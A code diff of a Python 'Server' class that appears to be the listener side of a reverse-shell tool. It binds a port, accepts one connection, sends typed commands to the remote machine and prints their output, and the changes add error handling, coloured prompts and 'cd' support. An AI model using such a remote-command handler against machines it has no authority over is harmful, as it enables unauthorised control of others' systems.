@@ -13,25 +13,30 @@ class Server:
 
 
     def connect(self):
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.bind((self.host, self.port))
-        self.server.listen(1)
-        print('[-] Wating for connection...')
-        print(f'listening on port {self.port}')
-        self.client, self.addr = self.server.accept()
-        print(f'[+] Connected to {self.addr}')
-        
+        try:
+            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server.bind((self.host, self.port))
+            self.server.listen(1)
+            print('\033[1m[-]\033[m Wating for connection...')
+            print(f'listening on port {self.port}\n')
+            self.client, self.addr = self.server.accept()
+            print(f'\033[1;32m[+]\033[m Connected to {self.addr}\n')
+        except OSError:
+            print('Host or Port already in use.')
+
 
     def shell(self):
         self.connect()
         while True:
             try:
-                command = input(f'{self.addr[0]}> ').lower().strip()
+                command = input(f'{self.addr[0]}:{self.addr[1]}~:>_ ').lower().strip()
                 if command in self.quit_list:
                     self.client.send(command.encode('utf-8'))
                     break
                 elif command == 'clear':
                     os.system(command)
+                elif command[:3] == 'cd ':
+                    self.client.send(command.encode('utf-8'))
                 else:
                     self.client.send(command.encode('utf-8'))
                     output = self.client.recv(1024).decode('utf-8')
